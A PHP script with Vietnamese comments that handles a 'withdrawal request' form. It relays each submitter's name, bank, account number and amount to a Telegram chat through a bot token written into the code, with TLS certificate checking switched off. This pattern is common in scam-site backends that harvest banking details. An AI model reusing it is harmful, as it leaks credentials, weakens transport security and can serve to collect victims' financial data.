<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Thông tin Telegram đã được cấu hình sẵn từ yêu cầu của bạn
    $botToken = "8664079130:AAGCDkMhNyjnfNM9wceQ_Pc301bIMYetvdA"; 
    $chatId = "6686303067";

    // Lấy dữ liệu từ Form gửi lên
    $fullname = html_copy($_POST['fullname']);
    $bank = html_copy($_POST['bank']);
    $accountNumber = html_copy($_POST['account_number']);
    $amount = html_copy($_POST['amount']);

    // Định dạng lại số tiền và thời gian
    $formattedAmount = number_format($amount) . " VND";
    $time = date("Y-m-d H:i:s");

    // Nội dung tin nhắn gửi về Telegram (hỗ trợ Markdown)
    $message = "🚨 *CÓ YÊU CẦU RÚT TIỀN MỚI* 🚨\n\n";
    $message .= "👤 *Chủ thẻ:* " . $fullname . "\n";
    $message .= "🏦 *Ngân hàng:* " . $bank . "\n";
    $message .= "💳 *Số tài khoản:* `" . $accountNumber . "`\n"; // Click vào để copy nhanh trên điện thoại
    $message .= "💵 *Số tiền:* *" . $formattedAmount . "*\n";
    $message .= "🕒 *Thời gian:* " . $time . "\n\n";
    $message .= "👉 _Vui lòng kiểm tra và thực hiện giao dịch!_";

    // Gửi dữ liệu sang Telegram API bằng cURL
    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);

    // Trả về thông báo cho người dùng trên web
    if ($response) {
        echo "<script>
                alert('Gửi yêu cầu rút tiền thành công! Vui lòng chờ hệ thống xử lý.');
                window.location.href = 'index.html';
              </script>";
    } else {
        echo "<script>
                alert('Có lỗi xảy ra, vui lòng thử lại sau.');
                window.history.back();
              </script>";
    }
} else {
    header("Location: index.html");
    exit();
}

// Hàm hỗ trợ lọc dữ liệu đầu vào tránh lỗi bảo mật cơ bản
function html_copy($data) {
    return htmlspecialchars(trim($data), ENT_QUOTES, 'UTF-8');
}
?>